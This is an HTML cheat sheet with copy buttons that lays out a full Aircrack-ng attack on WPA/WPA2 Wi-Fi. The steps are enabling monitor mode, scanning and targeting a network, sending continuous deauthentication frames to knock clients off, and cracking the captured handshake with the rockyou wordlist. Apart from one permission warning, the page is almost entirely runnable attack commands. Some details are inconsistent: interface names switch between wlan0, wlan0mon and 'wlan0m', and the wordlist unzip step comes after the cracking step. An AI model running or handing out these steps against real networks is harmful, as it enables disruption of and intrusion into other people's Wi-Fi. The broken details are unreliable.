<div class="container">
<p style="text-align: center; color: #aaa; font-size: 14px; margin-bottom: 20px;">Quick reference for capturing WPA/WPA2 handshakes and performing basic password cracking using Aircrack-ng.</p>
<div class="section">
<h2>Environment Setup</h2>
<div class="code">OS: Kali Linux (VMware / VirtualBox)<br>Wireless Adapter: External USB adapter (Monitor Mode supported)<br>Tools: Aircrack-ng suite<br>Wordlist: rockyou.txt</div>
<div class="purpose">This guide assumes you are running Kali Linux in a virtual machine with a compatible external wireless adapter that supports monitor mode and packet injection.</div>
<div class="screenshot">
  <img src="https://cdn.shopify.com/s/files/1/0667/8167/5618/files/11.png?v=1775250630" alt="Kali Linux setup screensho">
</div>
<div class="caption">VMware Kali Linux with Aircrack-ng installed</div>
</div>
<div class="warning">⚠️ Use only on networks you own or have permission to test.</div>
<!-- Step 1 -->
<div class="section">
<h2>1. Check Wireless Adapter</h2>
<div data-code="iwconfig" class="code">iwconfig <button class="copy-btn">Copy</button>
</div>
<div class="purpose">Displays available wireless interfaces (e.g., wlan0).</div>
<div class="screenshot">
  <img src="https://cdn.shopify.com/s/files/1/0667/8167/5618/files/1.png?v=1775249423" alt="iwconfig output">
</div>
<div class="caption">Example output showing wlan0 interface</div>
</div>
<!-- Step 2 -->
<div class="section">
<h2>2. Enable Monitor Mode</h2>
<div data-code="airmon-ng start wlan0" class="code">airmon-ng start wlan0 <button class="copy-btn">Copy</button>
</div>
<div class="purpose">Enables monitor mode and creates wlan0.</div>
<div class="screenshot">
  <img src="https://cdn.shopify.com/s/files/1/0667/8167/5618/files/2.png?v=1775249423" alt="monitor mode enabled">
</div>
<div class="caption">Monitor mode enabled (wlan0 created)</div>
</div>
<!-- Step 3 -->
<div class="section">
<h2>3. Kill Conflicting Processes</h2>
<div data-code="airmon-ng check kill" class="code">airmon-ng check kill <button class="copy-btn">Copy</button>
</div>
<div class="purpose">Stops interfering services.</div>
<div class="screenshot">
  <img src="https://cdn.shopify.com/s/files/1/0667/8167/5618/files/3.png?v=1775249422" alt="killing processes">
</div>
<div class="caption">Processes stopped to prevent interference</div>
</div>
<!-- Step 4 -->
<div class="section">
<h2>4. Scan Networks</h2>
<div data-code="airodump-ng wlan0mon" class="code">airodump-ng wlan0 <button class="copy-btn">Copy</button>
</div>
<div class="purpose">Shows nearby networks and clients.</div>
<div class="screenshot">
  <img src="https://cdn.shopify.com/s/files/1/0667/8167/5618/files/4.png?v=1775249423" alt="airodump-ng scan">
</div>
<div class="caption">Scanning for networks and clients</div>
</div>
<!-- Step 5 -->
<div class="section">
<h2>5. Target Specific Network</h2>
<div data-code="airodump-ng --bssid [BSSID] -c [CHANNEL] --write capture wlan0" class="code">airodump-ng --bssid [BSSID] -c [CHANNEL] --write capture wlan0 <button class="copy-btn">Copy</button>
</div>
<div class="purpose">Captures packets from a target network.</div>
<div class="screenshot">
  <img src="https://cdn.shopify.com/s/files/1/0667/8167/5618/files/5.png?v=1775249423" alt="target network capture">
</div>
<div class="caption">Capturing packets for the target network</div>
</div>
<!-- Step 6 -->
<div class="section">
<h2>6. Deauthentication</h2>
<div data-code="aireplay-ng --deauth 0 -a [BSSID] wlan0" class="code">aireplay-ng --deauth 0 -a [BSSID] wlan0 <button class="copy-btn">Copy</button>
</div>
<div class="purpose">Forces reconnect to capture handshake.</div>
<div class="screenshot">
  <img src="https://cdn.shopify.com/s/files/1/0667/8167/5618/files/6.png?v=1775249423" alt="deauth attack">
</div>
<div class="caption">Deauthentication to capture handshake</div>
</div>
<!-- Step 7 -->
<div class="section">
<h2>7. Crack Password</h2>
<div data-code="aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt" class="code">aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt <button class="copy-btn">Copy</button>
</div>
<div class="purpose">Attempts password cracking using a wordlist.</div>
<div class="screenshot">
  <img src="https://cdn.shopify.com/s/files/1/0667/8167/5618/files/10.png?v=1775250340" alt="aircrack-ng cracking">
</div>
<div class="caption">Password cracking using rockyou.txt</div>
</div>
<!-- Step 8 -->
<div class="section">
<h2>8. Wordlist Setup</h2>
<div data-code="gzip -d /usr/share/wordlists/rockyou.txt.gz" class="code">gzip -d /usr/share/wordlists/rockyou.txt.gz <button class="copy-btn">Copy</button>
</div>
<div class="purpose">Unzips rockyou.txt before use.</div>
<div class="screenshot">
  <img src="https://cdn.shopify.com/s/files/1/0667/8167/5618/files/9.png?v=1775250399" alt="unzip rockyou">
</div>
<div class="caption">Unzipping rockyou.txt for cracking</div>
</div>
<!-- Workflow -->
<div class="section">
<h2>Workflow</h2>
<div data-code="iwconfig → airmon-ng start wlan0 → airmon-ng check kill → airodump-ng wlan0m → capture target → deauth → aircrack-ng" class="code workflow">iwconfig → airmon-ng start wlan0 → airmon-ng check kill → airodump-ng wlan0 → capture target → deauth → aircrack-ng <button class="copy-btn">Copy</button>
</div>
</div>
<div class="footer">Aircrack-ng WiFi Attack Cheat Sheet</div>
</div>
<p> </p>
<script>
document.addEventListener("DOMContentLoaded", function () {
  const buttons = document.querySelectorAll(".copy-btn");

  buttons.forEach(btn => {
    btn.addEventListener("click", function () {
      const codeBlock = btn.parentElement;

      // Get clean text (remove "Copy" text)
      let text = codeBlock.innerText.replace("Copy", "").trim();

      navigator.clipboard.writeText(text).then(() => {
        btn.innerText = "Copied!";
        setTimeout(() => {
          btn.innerText = "Copy";
        }, 1500);
      });
    });
  });
});
</script>
